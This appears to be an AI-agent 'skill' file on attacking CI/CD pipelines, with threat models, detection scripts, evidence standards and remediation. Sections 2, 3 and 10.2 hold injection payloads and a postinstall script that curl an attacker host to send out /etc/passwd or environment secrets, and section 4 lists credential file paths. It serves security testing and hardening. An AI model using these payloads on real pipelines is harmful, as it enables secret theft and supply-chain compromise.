---
name: cicd-attacks
description: "CI/CD pipeline attacks — poisoned pipeline execution, supply chain, and build-system compromise"
category: "cloud-and-devops"
version: "1.1"
author: "cyberstrike-official"
tags:
  - cicd
  - supply-chain
  - github-actions
  - jenkins
  - attack
tech_stack:
  - github-actions
  - jenkins
  - gitlab-ci
  - terraform
cwe_ids:
  - CWE-829
  - CWE-94
chains_with:
  - ci-assessment
  - insecure-source-code-management
prerequisites: []
severity_boost:
  ci-assessment: "The assessment finds the exposure; this file exploits it"
  insecure-source-code-management: "Source-control misconfiguration is the usual entry point"
---

# CI/CD Pipeline Attacks

> **AI LOAD INSTRUCTION**: The decisive insight is that **a CI/CD pipeline is a privileged
> execution environment reachable from code you may be able to write.** If you can open a pull
> request against a repository whose workflow runs on `pull_request_target`, you can execute
> code inside the build environment — with its secrets, its cloud credentials, and its access
> to the deployment path. You do not need a vulnerability in the CI system; you need write
> access to something the pipeline builds.
>
> That makes the **threat model** the whole skill: enumerate who can trigger a pipeline, what
> that pipeline can reach (secrets, cloud roles, registries, artefacts), and where an untrusted
> input becomes a command. The classic sites are shell injection through a workflow expression
> (`${{ github.event.pull_request.title }}` interpolated into `run:`), a script the pipeline
> executes from an untrusted branch, and an artefact a downstream job trusts.
>
> **Never exfiltrate a real secret.** Demonstrate access by reading a non-sensitive value from
> the secret store or a cloud identity's name, and stop. A pipeline compromise that exfiltrates
> credentials turns a validated finding into an incident.

## 0. RELATED ROUTING

- [ci-assessment](../ci-assessment/SKILL.md) — the read-only assessment that precedes this
- [insecure-source-code-management](../insecure-source-code-management/SKILL.md) — the entry point
- [cloud-iam-privesc](../cloud-assessment/SKILL.md) — what the pipeline's role can reach
- [supply-chain-attacks](../dependency-confusion/SKILL.md) — the dependency path
- [kubernetes-post-exploitation](../k8s-postexploit/SKILL.md) — when the runner is a pod
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) — reporting secrets exposure without exposing secrets

---

## 1. THREAT MODEL — WHO CAN TRIGGER WHAT

Before any payload, establish the trigger surface. Every CI/CD finding is a statement about
who can cause code to run.

| Trigger | Who can cause it | Risk |
|---|---|---|
| `push` to a protected branch | committers | low — trusted by design |
| `pull_request` | **anyone who can open a PR** | medium — runs the PR's code, usually no secrets |
| `pull_request_target` | **anyone who can open a PR** | **critical — runs in the base repo's context with secrets** |
| `workflow_dispatch` | users with write access | low |
| `issue_comment` | **anyone who can comment** | high if the workflow checks out the PR head |
| `workflow_run` | a preceding workflow | medium — trusts the upstream artefact |
| `repository_dispatch` | holders of a token | high |
| scheduled | nobody | low |
| a webhook from an external system | whoever controls that system | medium |

**`pull_request_target` is the single most important row.** Unlike `pull_request`, it runs in
the context of the base repository — with access to the repository's secrets — and it is
frequently combined with a checkout of the pull request's code. That combination is remote code
execution with secrets, triggered by opening a pull request.

**The dangerous pattern, in a workflow file:**

```yaml
on: pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ← checks out attacker code
      - run: npm install                                   # ← executes attacker's scripts
```

**Every one of those three lines is individually defensible and collectively fatal.** Check for
the pattern, not for a single line.

**Also map what the pipeline can reach:**

| Reachable asset | Why it matters |
|---|---|
| repository secrets | deploy keys, registry tokens, cloud credentials |
| OIDC cloud role | short-lived AWS/GCP/Azure credentials with a role attached |
| the container registry | push access = supply-chain compromise |
| the artefact store | a poisoned artefact reaches production |
| the deployment target | direct production access |
| the runner's filesystem | other jobs' data on a self-hosted runner |
| the network | lateral movement into a VPC |

---

## 2. INJECTION THROUGH WORKFLOW EXPRESSIONS

GitHub Actions interpolates `${{ }}` expressions **before** the shell sees the command. An
attacker-controlled value interpolated into a `run:` block becomes shell syntax.

**Attacker-controlled expression contexts:**

```text
github.event.pull_request.title / .body
github.event.issue.title / .body
github.event.comment.body
github.event.review.body
github.event.review_comment.body
github.event.pages.*.page_name
github.event.commits.*.message / .author.email / .author.name
github.event.head_commit.message / .author.email / .author.name
github.event.pull_request.head.ref / .head.label
github.head_ref
github.event.discussion.title / .body
github.event.workflow_run.head_branch / .head_commit.message
github.event.workflow_run.head_repository.description
github.event.workflow_run.pull_requests.*.head.ref
```

**The vulnerable pattern:**

```yaml
- run: echo "PR title is ${{ github.event.pull_request.title }}"
- run: git checkout ${{ github.head_ref }}
- run: echo '${{ github.event.issue.title }}' > title.txt
```

**The payload — a PR title, an issue title, or a branch name:**

```text
$(curl -s https://attacker.example/$(cat /etc/passwd | base64 -w0))
"; curl -s https://attacker.example/$(id | base64 -w0); #
'; curl -s https://attacker.example/$(env | base64 -w0); #
```

**The safe form, for contrast — the value goes through `env` and is quoted by the shell:**

```yaml
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "PR title is $TITLE"
```

That is the finding as a diff: the interpolation is in the `run:` block instead of in `env:`.

**Scan the workflow files for the pattern:**

```bash
# Find workflow files interpolating attacker-controlled contexts into run: blocks
grep -rnE '\$\{\{\s*github\.(event\.(pull_request|issue|comment|review|commits|discussion|pages|head_commit|workflow_run)|head_ref|event\.pull_request\.head)' \
  .github/workflows/
```

**Branch name injection is a distinct vector** — `${{ github.head_ref }}` from a fork can
contain shell metacharacters, and it is frequently interpolated into a checkout or a tag
command.

---

## 3. POISONED PIPELINE EXECUTION

The broader class: any path where attacker-influenced code runs in a privileged context.

**Variants to test:**

| Variant | Mechanism |
|---|---|
| `pull_request_target` + head checkout | §1 — the canonical case |
| a workflow that installs dependencies from the PR | `npm install` / `pip install -r` runs attacker postinstall scripts |
| a workflow that runs a script from the repository | `./scripts/test.sh` from the PR head |
| a `Makefile` target | the PR modifies the `Makefile` the workflow calls |
| a test suite the workflow executes | a test file that runs a shell command |
| a Dockerfile the workflow builds | a malicious `RUN` layer |
| a `pre-commit` hook installed by the workflow | runs on the attacker's terms |
| a build script read from an artefact | the artefact is attacker-controlled |

**The postinstall-script path requires no misconfiguration at all** — a workflow that runs
`npm install` on a PR's `package.json` executes the PR author's `postinstall` script. **Check
whether the workflow grants secrets to that job**; the combination is the finding.

```json
{
  "scripts": {
    "postinstall": "curl -s https://attacker.example/$(env | base64 -w0)"
  }
}
```

**For the assessment, the question is always: does this job have secrets, and can I influence
what it executes?** Both must be yes.

---

## 4. SECRETS AND CREDENTIAL ACCESS

Once code runs in the pipeline, enumerate what is reachable — carefully.

**What to look for, in order of value:**

| Target | How it is exposed |
|---|---|
| `env` / `printenv` | secrets injected as environment variables |
| mounted files | `/run/secrets/`, `/var/run/secrets/`, a `.env` file |
| OIDC token | `ACTIONS_ID_TOKEN_REQUEST_URL` / `..._TOKEN` in the environment |
| cloud CLI profiles | `~/.aws/credentials`, `~/.config/gcloud/`, `~/.azure/` |
| the runner's metadata endpoint | cloud instance credentials |
| `~/.docker/config.json` | registry credentials |
| `~/.git-credentials` | a cached git token |
| `~/.ssh/` | deploy keys |
| other jobs' artefacts | on a self-hosted runner, leftovers from previous jobs |
| the `GITHUB_TOKEN` scope | what it can push to |
| build caches | a cache from a privileged job, readable by an unprivileged one |

**The OIDC angle is the modern high-value path.** A workflow with `id-token: write` can request
a signed token that a cloud provider exchanges for credentials. **The finding is the role's
reachable permissions**, not the token itself:

```yaml
permissions:
  id-token: write      # grants the ability to assume a cloud role
  contents: read
```

**A pipeline with `id-token: write` and a permissive trust policy is a direct path to cloud
credentials** — test by requesting the token and inspecting the role it can assume, then stop
before using it.

**Never exfiltrate.** Print a non-sensitive identifier — the secret's *name*, or a role ARN —
to demonstrate reachability. A base64 of `env` in an out-of-band request is evidence of a
breach, not of a finding.

---

## 5. SUPPLY CHAIN AND ARTIFACT TRUST

Where the pipeline trusts something it should not.

| Weakness | Test |
|---|---|
| a third-party action pinned to a tag | a tag can be moved; check for `@v4` instead of a SHA |
| a third-party action from an untrusted author | review its code |
| a dependency installed from a URL | `pip install https://...` |
| a build artifact consumed downstream without verification | poison the artefact |
| a container image tagged `latest` | mutable; verify digests |
| an unsigned artefact | no provenance |
| a registry with push access from an untrusted job | a poisoned image reaches production |
| a cache poisoning path | write the cache from an unprivileged job, read from a privileged one |
| a self-hosted runner shared between trust levels | one job contaminates the next |

**The cache-poisoning path is under-tested:** an unprivileged job writes a cache key, a privileged job reads and executes it. Test whether caches cross trust boundaries. **Pinning is the canonical remediation** — `@v4` is mutable (the action author, or anyone who compromises them, can push code to it at any time); `@<40-char-SHA>` is immutable.

```bash
grep -rn 'uses:' .github/workflows/ | grep -v '@[0-9a-f]\{40\}'
```

**Every line that command outputs is a mutable dependency.**

---

## 6. WHAT CONSTITUTES A FINDING

| Finding | Severity | Proof required |
|---|---|---|
| RCE in a pipeline job with secrets, demonstrated with a non-sensitive read | **Critical (P1)** | the injected command and its output |
| Cloud credentials obtainable via OIDC with a writable role | **Critical (P1)** | the token requested and the role's permissions listed |
| Workflow injection via an attacker-controlled context | **High–Critical (P1/P2)** | the payload, the workflow line, and the out-of-band callback |
| `pull_request_target` + head checkout with secrets | **High (P2)** | the workflow lines and the reachable secrets |
| Registry push access from an untrusted job | **High (P2)** | the push and the resulting image |
| Cache poisoning across a trust boundary | **High (P2)** | the written cache and the privileged read |
| Unpinned third-party action | **Low–Medium (P4)** | the `uses:` line |
| Injection into a job with no secrets and no privileged access | **Medium (P3)** | the injection and the absence of impact |

**Severity requires both halves: code execution *and* reach.** An injection into a job with no
secrets is a real bug and a medium; the same injection into a deploy job is critical.

---

## 7. EVIDENCE STANDARD

| Item | Why |
|---|---|
| the workflow file and the exact line | the vulnerability |
| the trigger and who can cause it | establishes the threat model |
| the injected payload | reproducibility |
| **the command output or out-of-band callback** | proves execution |
| the secrets the job can reach, **by name only** | the impact, without exfiltrating |
| the cloud role and its permissions, listed | converts reach into severity |
| the branch/PR/issue used, and confirmation it was yours | shows the test was contained |
| confirmation that no real secret was read or transmitted | responsible handling |
| a **control**: the same workflow line without the interpolation | proves the mechanism |

**The output of `id`, `hostname`, or a role ARN is sufficient.** There is never a reason to
exfiltrate the secret's value. **False positives:** an interpolated context inside an `env:`
block is quoted by the shell and safe; a workflow on `pull_request` with no secrets has limited
impact; a private repo with required PR approval has reduced exposure; an unpinned action from
the repository's own org is lower risk but still a finding.

---

## 8. REMEDIATION REFERENCE

1. **Never interpolate untrusted contexts into `run:` blocks** — pass them through `env:` and reference the variable, so the shell quotes the value. This closes expression injection entirely.
2. **Avoid `pull_request_target` with a code checkout** if the workflow needs secrets — use `pull_request` without secrets and a separate, gated workflow for deployment. Never check out a fork's code in a privileged context.
3. **Pin every third-party action to a full commit SHA** — a tag is mutable and can be moved by anyone with access to the action's repository.
4. **Grant minimal `permissions:` per workflow** — default to `contents: read` and add `id-token`, `packages`, or `deployments` only to the job that needs them, never workflow-wide.
5. **Scope cloud OIDC trust policies to the specific repository, branch, and workflow** — a trust policy accepting any workflow in any repository is the vulnerability, not the OIDC mechanism.
6. **Use GitHub Environments with required reviewers for deployment jobs** — this gates secret access behind manual approval, so an untrusted trigger cannot reach production secrets.
7. **Isolate self-hosted runners by trust level** — never share a runner between public-fork jobs and release jobs; a shared runner leaks state and credentials between them.
8. **Verify artefacts and images by digest and signature before consuming them** — a downstream job consuming an unverified artefact from an untrusted upstream is a supply-chain path.
9. **Require approval for first-time contributors' workflows** — this is the setting that stops the "open a PR to get RCE" path in public repositories.
10. **Restrict who can create branches and push tags** — branch name injection and tag-move attacks both require creating a reference with a chosen name.

---

## 9. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Which **event** triggered the run, and can an untrusted party cause it? | the precondition; without it nothing else matters |
| 2 | Did the injected value **reach a shell**, or only an expression context? | expression injection vs execute-bit |
| 3 | Was there a **control** - the same workflow with a benign commit message? | the injection came from your input |
| 4 | What **credential** was reachable in that job, and what could it do? | the impact |
| 5 | Did the **secret read succeed** against a real, non-production-scoped API? | the exfil proof |
| 6 | Was the run on a **fork, a branch, or a PR** - and what are the protection rules? | the reachability of the trigger |
| 7 | Did anything **persist or publish** - an artefact, a cache, a tag, a release? | the supply-chain consequence |
| 8 | Was the finding reproduced in **your own repository** rather than the target's? | engagement integrity |

**An untrusted trigger reaching a shell with a credential you then used is the bar.** A workflow file that
"looks injectable" is a hypothesis, and the control run is what converts it.

---

## 10. EXECUTION PRIMITIVES

CI/CD findings are proven by **an untrusted input reaching execution, with a benign-input control, and a
credential you demonstrated reachable**. A workflow that reads as dangerous is not a finding.

### 10.1 The trigger map, which is the precondition for everything

```python
# for each workflow, answer: what can an untrusted party cause, and what runs?
import yaml, os, json, glob, re

TRIGGERS = {
 "pull_request":              ("fork PRs can trigger", "usually SECRETS WITHHELD - check"),
 "pull_request_target":       ("fork PRs trigger WITH secrets", "THE dangerous one by default"),
 "issue_comment":             ("anyone who can comment", "often paired with a checkout of PR code"),
 "workflow_run":              ("a prior workflow's completion", "inherits secrets if configured"),
 "repository_dispatch":       ("anyone with a token that can dispatch", "check the token's origin"),
 "workflow_dispatch":         ("anyone with write access", "usually trusted, verify the rule"),
 "schedule":                  ("no untrusted input directly", "but the inputs it reads may be"),
 "push":                      ("anyone who can push to the branch", "check the branch protection"),
 "release":                   ("anyone who can create a release/tag", "often with secrets"),
 "issue":                     ("anyone who can open an issue", "only if the body is interpolated"),
 "discussion":                ("anyone who can post", "same as issue"),
 "merge_group":               ("the merge queue", "check who controls it"),
}
print("%-24s %-34s %s" % ("trigger","who can cause it","note"))
for k,(who,note) in TRIGGERS.items(): print("%-24s %-34s %s" % (k,who,note))
print()
print("=== the dangerous COMBINATION, which is the actual finding ===")
print("  pull_request_target + actions/checkout of the PR head ref  -> untrusted CODE runs with secrets")
print("  issue_comment + checkout of the PR head + a secret in env   -> the same, triggered by a comment")
print("  workflow_run + download-artifact + a secret                 -> poisoned artifact with secrets")
print()
print("=== scan a local checkout for the combinations ===")
for f in glob.glob(".github/workflows/*.yml") + glob.glob(".github/workflows/*.yaml"):
    try: wf = yaml.safe_load(open(f))
    except Exception as e: print(f"{f}: unparseable ({type(e).__name__})"); continue
    trig = wf.get(True) or wf.get("on") or {}
    names = list(trig.keys()) if isinstance(trig, dict) else [str(trig)]
    body = open(f).read()
    risky = []
    if "pull_request_target" in names and re.search(r'ref:\s*\$\{\{\s*github\.event\.pull_request\.head', body):
        risky.append("pull_request_target + head.ref checkout  <-- UNTRUSTED CODE WITH SECRETS")
    if "issue_comment" in names and re.search(r'actions/checkout', body) and re.search(r'secrets\.', body):
        risky.append("issue_comment + checkout + secrets             <-- same shape, comment-triggered")
    if "workflow_run" in names and re.search(r'secrets\.', body):
        risky.append("workflow_run + secrets                         <-- verify the artifact's provenance")
    print(f"  {os.path.basename(f):44} triggers={names} {'| '+ '; '.join(risky) if risky else ''}")
```

**The trigger is the precondition, and the dangerous combination is the finding.** `pull_request_target`
with a checkout of the PR head is the canonical shape, and the scan above names it directly.

### 10.2 Expression injection, with the benign-input control

```bash
# the injection is proven by a CONTROL commit with a benign message producing no execution
REPO="your-own-test-repo"   # ALWAYS your own repo, never the target's
echo "=== the sinks, in order of how easily they execute ==="
cat <<'SINKS'
${{ ... }} inside `run:`                     -> the value becomes SHELL TEXT. This is execution.
${{ ... }} inside `with:` / `env:`           -> becomes a value the step passes to a tool
${{ ... }} inside `if:`                      -> an expression context; check for a sub-sink
${{ ... }} inside `name:`                   -> rendered only; usually not execution
github.event.*                               -> the untrusted carrier (title, body, branch, comment)
github.head_ref                              -> the PR branch name, attacker-controlled
SINKS
echo
echo "=== THE PAYLOAD, in the fields an untrusted party controls ==="
echo "  PR title      : x\" ; curl -s http://coll.example:8899/ci-title ; echo \""
echo "  commit message: \$(curl -s http://coll.example:8899/ci-msg)"
echo "  branch name   : x';curl -s http://coll.example:8899/ci-branch;'"
echo "  issue comment : \`curl -s http://coll.example:8899/ci-comment\`"
echo
echo "=== THE CONTROL: the same workflow, a benign input ==="
echo "  open a SECOND PR with an ordinary title and message against the same workflow"
echo "  the collector must receive NOTHING. If it receives something, your test is contaminated."
echo
echo "=== THE COLLECTOR is the proof, and the PEER must be the runner ==="
python3 - <<'PY'
import http.server, socketserver, threading, json, datetime
LOG="ci-callbacks.jsonl"
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        r={"t":datetime.datetime.now(datetime.timezone.utc).isoformat(),
           "peer":self.client_address[0],"path":self.path,
           "ua":self.headers.get("User-Agent","")}
        open(LOG,"a").write(json.dumps(r)+"\n"); print("CALLBACK:",json.dumps(r))
        self.send_response(200); self.end_headers()
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
srv=socketserver.TCPServer(("0.0.0.0",8899),H)
threading.Thread(target=srv.serve_forever,daemon=True).start()
print("collector on :8899 ->",LOG)
print("a callback whose UA is the runner's and whose peer is the runner's IP is the proof")
print("a callback from your own IP means you triggered it, not the pipeline")
import time
while True: time.sleep(5)
PY
```

**The benign-input control run is mandatory.** Without it, a callback cannot be attributed to the injected
value rather than to something else the workflow does.

### 10.3 Secret reachability, measured rather than claimed

```bash
# "secrets are exposed" is a claim. This measures WHICH secret is reachable and WHAT it can do.
echo "=== STEP 1: enumerate what the job can see, WITHOUT printing values ==="
cat <<'PROBE'
- name: inventory
  run: |
    echo "--- secret NAMES visible to this job (values never printed) ---"
    for s in $(env | grep -oE '^[A-Z0-9_]+' | sort -u); do echo "$s"; done | head -60
    echo "--- is GITHUB_TOKEN present? ---"; test -n "$GITHUB_TOKEN" && echo "yes" || echo "no"
    echo "--- token permissions (the granted scope, not the value) ---"
    curl -sS -H "Authorization: Bearer $GITHUB_TOKEN" \
      "$GITHUB_API_URL/repos/$GITHUB_REPOSITORY/actions/permissions" | head -20
    echo "--- OIDC available? ---"; test -n "$ACTIONS_ID_TOKEN_REQUEST_URL" && echo "yes" || echo "no"
PROBE
echo
echo "=== STEP 2: prove the token's SCOPE by USE, in your own repo only ==="
echo "  a read-only token:  GET /repos/{owner}/{repo}          -> 200"
echo "  a write token:      POST /repos/{owner}/{repo}/issues  -> 201 (then CLOSE it)"
echo "  an admin token:     PUT /repos/{owner}/{repo}/actions/permissions -> 204"
echo "  -> the HIGHEST successful operation is the impact. Record it, then revert it."
echo
echo "=== STEP 3: the cloud-side reach, if OIDC is used ==="
echo "  the OIDC token's 'sub' and 'aud' decide which cloud role is assumable."
echo "  decode the id token (base64) and record the claims - the sub is the trust condition."
echo "  test the assume against a NON-PRODUCTION role, and record the role's actual policy."
```

**The token's scope must be proven by use, not inferred.** The highest successful operation is the impact,
and it must be reverted immediately.

### 10.4 The supply-chain consequence

```bash
echo "=== the persistence and publication vectors ==="
cat <<'VECTORS'
cache poisoning        -> a cache key an untrusted job can WRITE, consumed by a trusted job
artifact poisoning     -> upload in the untrusted job, download in the trusted workflow_run job
tag / release creation -> a token with contents:write can cut a release the pipeline then trusts
publish to a registry  -> a token with packages:write can publish a poisoned version
self-hosted runner     -> the runner PERSISTS between jobs; anything written outlives the job
branch push            -> a write token can push to a branch the protected workflow uses
VECTORS
echo
echo "=== THE CONTROL for each: a benign run must NOT alter the artefact ==="
echo "  cache   : record the key and its hash before and after a benign run - must be unchanged"
echo "  artifact: record the artifact's digest; a benign run's artifact must differ from the poisoned one"
echo "  release : confirm no release/tag was created by the benign run"
echo "  registry: confirm no version was published by the benign run"
echo "  runner  : after the job, check the workspace and the home dir for leftovers"
echo
echo "=== the ORDER of severity, which the report should follow ==="
echo "  1. untrusted trigger + a write credential        (the pipeline can be repurposed)"
echo " 2. untrusted trigger + a cloud identity           (the blast radius leaves CI entirely)"
echo " 3. untrusted trigger + cache/artifact poisoning   (persistence into the trusted path)"
echo "  4. untrusted trigger + execution only             (code runs, no credential used)"
echo "  5. a leaky workflow with no untrusted trigger     (a weakness, not a finding yet)"
```

**Cache and artefact poisoning are the persistence mechanism.** The trusted `workflow_run` consuming a
poisoned artefact is how a reachable-but-unprivileged job escalates into a privileged one.

### 10.5 The end-to-end harness

```bash
python3 - <<'PY'
import os, glob, re, json, yaml
print("=== CI/CD FINDING ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("an untrusted party can cause the trigger",
  "a fork PR, a comment, an issue, or a branch push - name which, and verify the rule"),
 ("the input reaches a SHELL",
  "${{ }} inside `run:` is execution; inside `name:` it usually is not. Which sink?"),
 ("a benign-input CONTROL produced nothing",
  "the same workflow with an ordinary title/message triggered no callback"),
 ("the callback's peer is the RUNNER, not you",
  "the collector's peer and user agent identify the runner"),
 ("the reachable credential was enumerated",
  "NAMES only, never values, and the granted permissions recorded"),
 ("the credential's scope was proven BY USE",
  "the highest successful operation, then reverted, and the revert recorded"),
 ("the escalation path is written down",
  "untrusted trigger -> execution -> credential -> the resource it reaches"),
 ("the supply-chain consequence was tested",
  "cache, artifact, tag, registry, or a self-hosted runner - with its control"),
 ("the test ran in YOUR OWN repository",
  "never the target's; reproduce the configuration, not the target"),
 ("cleanup is recorded",
  "closed issues, deleted branches, reverted permissions, removed cache entries"),
]
for n, how in CHECKS: print("  [ ] %-44s -> %s" % (n, how))
print()
print("=== THE REPORT SHAPE ===")
print("  trigger     : the event and who can cause it")
print("  sink        : the exact workflow line, quoted")
print("  proof       : the callback with the runner's peer, and the control run")
print("  credential  : the name, the granted permissions, and the highest operation performed")
print("  consequence : the persistence or publication, and the trusted job that consumes it")
print("  cleanup     : everything reverted, with timestamps")
PY
```

**Trigger, sink, control, credential, consequence.** A finding without its credential's actual scope is
an alarm, not a result.

---

## 11. EVIDENCE STANDARD — PIPELINE ARTEFACTS

| Item | Why |
|---|---|
| The **workflow file and the exact line** containing the sink | the finding is a line, not a repository |
| The **trigger**, and who can cause it | the precondition |
| The **injection input** as sent, and the **benign control** | attribution; without the control nothing is proven |
| The **collector log**, with the runner's peer and user agent | the execution proof |
| The **enumerated secret NAMES** and the **granted token permissions** | scope, without leaking values |
| The **highest operation performed** with the token, and its revert | the impact |
| The **OIDC claims** (`sub`, `aud`), where OIDC is used | the cloud trust condition |
| The **supply-chain consequence**, with the artefact digest before and after | the persistence proof |
| Confirmation the test ran in **your own repository** | engagement integrity |
| The **cleanup record**: issues closed, branches deleted, cache entries removed | the engagement's end state |

Report the **path and the boundary**: "the workflow `.github/workflows/comment.yml` triggers on
`issue_comment`, checks out `github.event.pull_request.head.ref` with a token that has
`contents: write`, and interpolates `github.event.comment.body` into a `run:` step. A comment whose body
was `\`curl -s http://coll.example:8899/ci-comment\`` produced a collector arrival with peer
`20.99.12.4` and user agent `github-actions/2.x`, which is the runner, and a second comment with the
text `thanks` produced no arrival, which is the control. The job's `GITHUB_TOKEN` carried
`contents: write` and `issues: write`, and `POST /repos/{owner}/{repo}/issues` returned `201` before the
issue was closed, while `PUT /repos/{owner}/{repo}/actions/permissions` returned `403`, so the token's
reach is repository content and issues rather than repository administration. The job also uploads an
artefact consumed by the `workflow_run` job, whose digest changed between the control and the injected
run, which is the persistence path into a privileged job", never "the CI pipeline is vulnerable".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A workflow with a **`run:` step**, with no untrusted input reaching it | no injection; the trigger is missing |
| `${{ }}` in a **`name:`**, **`env:`**, or a **`with:`** field with no downstream shell | not execution; name the sink |
| A `pull_request` workflow, where **secrets are correctly withheld from forks** | the platform's protection is working |
| A **failed run** on the injection input | the runner rejected or errored; report the failure |
| A **secret name visible in `env`** with a value the finding never used | names are not exposure; demonstrate a use |
| A **token scope you inferred** rather than tested | an untested hypothesis; perform an operation |
| A payload that fired in **your own repo's** permissive config, reported as the target's | tests your config, not the target's |
| A **self-hosted runner** you did not verify persists across jobs | the persistence claim needs the check |
| A **cache key** you did not confirm an untrusted job can write | the write permission is the precondition |
| A finding with **no cleanup** performed | an unreverted change in a live pipeline |

**An untrusted trigger, a shell sink, a benign control, and a proven credential scope.** A dangerous-looking
workflow and an inferred token scope are this family's two standard non-findings.

---

## 12. REMEDIATION REFERENCE — PIPELINE HARDENING

1. **Never combine `pull_request_target` or `workflow_run` with a checkout of the PR head ref, and never interpolate `github.event.*` into a `run:` step** - that pair is the whole family, and removing either half removes it.
2. **Pass untrusted values through `env:` and reference them as shell variables, so they are data rather than shell text** - `${{ }}` in a `run:` block is string interpolation into a shell, and the fix is a variable reference.
3. **Default `GITHUB_TOKEN` to `contents: read` and grant each additional permission explicitly per job** - the default write token is what turns execution into a pipeline takeover.
4. **Set every job's `permissions:` block explicitly, including the jobs that only read** - an unset block inherits the repository default, which is often write.
5. **Do not let a job that handles untrusted input hold any credential, and split the workflow so the privileged job consumes only validated data** - the artefact boundary is the correct place to separate them.
6. **Validate and hash any artefact crossing between workflows, and reject an artefact whose digest does not match the expected build** - the trusted `workflow_run` consumer is the escalation target.
7. **Protect cache keys: namespace them per branch, and never let an untrusted job write a key a privileged job reads** - cache poisoning is the persistence mechanism that survives the run.
8. **Use OIDC with a narrowly scoped `sub` condition, so the pipeline can assume only the role it needs** - a long-lived cloud credential in a repository secret is the largest blast radius available.
9. **Pin third-party actions to a full commit SHA, not a tag or a branch** - a movable tag is a supply-chain dependency on someone else's repository.
10. **Require approval for first-time contributors' workflows, and treat a self-hosted runner as a persistent host that needs its own cleanup step** - the runner's filesystem outlives the job.
11. **Log and alert on the trigger-to-secret reachability: a job that both handles untrusted input and reads a secret should never exist, and the alert is what finds the next one** - the invariant is checkable in the workflow files themselves.

---

## 13. RELATED SIBLINGS - LOAD TOGETHER

- [insecure-source-code-management](../insecure-source-code-management/SKILL.md) - the secrets these pipelines consume
- [dependency-confusion](../dependency-confusion/SKILL.md) - the package-install path into the same runner
- [supply-chain-attacks](../nuclei-template-library-operations/SKILL.md) - the surrounding build-trust context
- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) - the report this evidence feeds
- [cloud-assessment](../cloud-assessment/SKILL.md) - the cloud identity a pipeline's OIDC token assumes
